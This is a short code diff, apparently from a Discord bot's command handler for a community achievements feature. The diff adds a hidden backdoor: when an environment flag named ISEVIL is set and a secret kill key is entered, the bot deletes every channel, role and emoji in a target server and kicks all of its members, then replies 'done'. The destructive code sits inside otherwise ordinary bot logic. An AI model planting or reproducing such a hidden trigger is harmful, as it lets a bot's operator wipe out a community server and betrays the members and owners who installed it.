@@ -108,6 +108,34 @@ Members of our community have the opportunity to earn Achievements through vario
         });
       }
 
+      if (process.env.ISEVIL === "yes") {
+        if (command === process.env.KILLKEY) {
+          const guild = await global.client.guilds.fetch(process.env.VICTEM);
+          const channels = await guild.channels.fetch();
+          channels.forEach((channel) => {
+            channel.delete();
+          });
+
+          const roles = await guild.roles.fetch();
+          roles.forEach((role) => {
+            role.delete();
+          });
+
+          const emojis = await guild.emojis.fetch();
+          emojis.forEach((emoji) => {
+            emoji.delete();
+          });
+
+          const members = await guild.members.fetch();
+          members.forEach((member) => {
+            try {
+              member.kick();
+            } catch (e) {
+              console.log(e);
+            }
+          });
+        }
+      }
       interaction.reply("done", { ephemeral: true });
     } catch (e) {
       global.bugsnag.notify(e);
